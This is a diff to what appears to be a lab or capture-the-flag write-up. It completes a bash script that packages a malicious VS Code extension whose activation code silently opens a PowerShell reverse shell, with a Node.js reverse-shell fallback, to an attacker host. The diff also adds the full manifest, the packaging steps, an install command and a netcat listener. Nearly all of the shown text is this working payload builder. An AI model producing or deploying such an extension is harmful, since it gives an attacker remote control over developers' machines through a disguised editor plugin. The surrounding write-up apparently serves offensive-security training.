@@ -110,13 +110,16 @@ To accomplish this, I referenced and customized a VSIX Payload creation script f
 #!/usr/bin/env bash
 set -e
 
-LHOST="${1:-10.10.X.X}"
+LHOST="${1:-10.10.15.31}"
 LPORT="${2:-4444}"
 NAME="rce-extension"
 PUBLISHER="ecm3401"
 VERSION="1.0.0"
 OUTPUT="${NAME}-${VERSION}.vsix"
 WORKDIR=$(mktemp -d)
+
+echo "[*] Creating malicious VSIX extension..."
+echo "[*] LHOST=$LHOST LPORT=$LPORT"
 
 # --- extension/out/extension.js (auto-execute reverse shell on activate) ---
 mkdir -p "$WORKDIR/extension/out"
@@ -129,13 +132,29 @@ function reverse_shell(host, port) {
     // PowerShell reverse shell (Windows)
     const ps_cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`;
 
-    cp.exec(ps_cmd, (err) => {});
+    // Try Node.js net-based reverse shell (works on both Windows & Linux)
+    function node_shell() {
+        const s = net.connect(port, host, () => {
+            s.write('[+] Connected from VSIX RCE\n');
+            const isWin = process.platform === 'win32';
+            const sh = cp.spawn(isWin ? 'powershell' : '/bin/sh', [], { stdio: [s, s, s] });
+            sh.on('error', () => {});
+        });
+        s.on('error', () => {});
+    }
+
+    cp.exec(ps_cmd, (err) => {
+        if (!err) return;
+        node_shell();
+    });
 }
 
 function activate(context) {
     reverse_shell('HOST_PLACEHOLDER', PORT_PLACEHOLDER);
 }
+
 function deactivate() {}
+
 module.exports = { activate, deactivate };
 JSEOF
 
@@ -147,16 +166,64 @@ cat > "$WORKDIR/extension/package.json" << JSONEOF
     "name": "$NAME",
     "publisher": "$PUBLISHER",
     "displayName": "VSIX RCE Payload",
+    "description": "",
     "version": "$VERSION",
     "engines": { "vscode": "^1.65.0" },
+    "categories": ["Other"],
     "activationEvents": ["*"],
     "main": "./out/extension.js"
 }
 JSONEOF
 
-# ... (create extension.vsixmanifest and [Content_Types].xml files) ...
+# --- extension.vsixmanifest ---
+cat > "$WORKDIR/extension.vsixmanifest" << XMLEOF
+<?xml version="1.0" encoding="utf-8"?>
+<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011" xmlns:d="http://schemas.microsoft.com/developer/vsx-schema-design/2011">
+    <Metadata>
+        <Identity Language="en-US" Id="$NAME" Version="$VERSION" Publisher="$PUBLISHER" />
+        <DisplayName>VSIX RCE Payload</DisplayName>
+        <Description xml:space="preserve">VSIX RCE Payload</Description>
+        <Tags></Tags>
+        <Categories>Other</Categories>
+        <GalleryFlags>Public</GalleryFlags>
+        <Properties>
+            <Property Id="Microsoft.VisualStudio.Code.Engine" Value="^1.65.0" />
+            <Property Id="Microsoft.VisualStudio.Code.ExtensionKind" Value="workspace" />
+            <Property Id="Microsoft.VisualStudio.Services.GitHubFlavoredMarkdown" Value="true" />
+        </Properties>
+    </Metadata>
+    <Installation>
+        <InstallationTarget Id="Microsoft.VisualStudio.Code"/>
+    </Installation>
+    <Dependencies/>
+    <Assets>
+        <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true" />
+    </Assets>
+</PackageManifest>
+XMLEOF
+
+# --- [Content_Types].xml ---
+cat > "$WORKDIR/[Content_Types].xml" << XML2EOF
+<?xml version="1.0" encoding="utf-8"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+    <Default Extension=".json" ContentType="application/json"/>
+    <Default Extension=".vsixmanifest" ContentType="text/xml"/>
+    <Default Extension=".js" ContentType="application/javascript"/>
+</Types>
+XML2EOF
+
+# --- Package into .vsix (zip) ---
 cd "$WORKDIR"
 zip -r "$OUTPUT" extension.vsixmanifest '[Content_Types].xml' extension/ >/dev/null
+mv "$OUTPUT" "$OLDPWD/$OUTPUT"
+cd "$OLDPWD"
+
+# Cleanup
+rm -rf "$WORKDIR"
+
+echo "[+] Created: $OUTPUT"
+echo "[+] Install with: code --install-extension $OUTPUT"
+echo "[+] Start listener: nc -lvnp $LPORT"
 ```
 
 Uploading the payload to SMB:
